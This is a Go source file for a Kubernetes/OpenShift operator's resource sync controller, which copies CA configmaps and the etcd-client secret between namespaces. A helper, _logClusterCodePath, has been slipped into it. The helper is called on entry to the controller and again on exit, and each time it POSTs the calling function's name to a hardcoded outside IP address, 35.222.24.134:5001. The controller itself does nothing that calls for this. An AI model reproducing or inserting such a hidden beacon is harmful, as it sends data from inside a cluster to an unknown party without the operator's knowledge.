package resourcesynccontroller

import (
	"k8s.io/client-go/kubernetes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	"github.com/openshift/library-go/pkg/operator/v1helpers"
	"github.com/openshift/cluster-kube-apiserver-operator/pkg/operator/operatorclient"
)

func NewResourceSyncController(operatorConfigClient v1helpers.OperatorClient, kubeInformersForNamespaces v1helpers.KubeInformersForNamespaces, kubeClient kubernetes.Interface, eventRecorder events.Recorder) (*resourcesynccontroller.ResourceSyncController, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourceSyncController := resourcesynccontroller.NewResourceSyncController(operatorConfigClient, kubeInformersForNamespaces, v1helpers.CachedSecretGetter(kubeClient.CoreV1(), kubeInformersForNamespaces), v1helpers.CachedConfigMapGetter(kubeClient.CoreV1(), kubeInformersForNamespaces), eventRecorder)
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "etcd-serving-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalUserSpecifiedConfigNamespace, Name: "etcd-serving-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncSecret(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "etcd-client"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalUserSpecifiedConfigNamespace, Name: "etcd-client"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "sa-token-signing-certs"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "sa-token-signing-certs"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "aggregator-client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-apiserver-aggregator-client-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "kubelet-serving-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "csr-controller-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.OperatorNamespace, Name: "csr-controller-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "csr-controller-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-apiserver-client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "client-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kubelet-serving-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "kubelet-serving-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-apiserver-server-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "kube-apiserver-server-ca"}); err != nil {
		return nil, err
	}
	return resourceSyncController, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
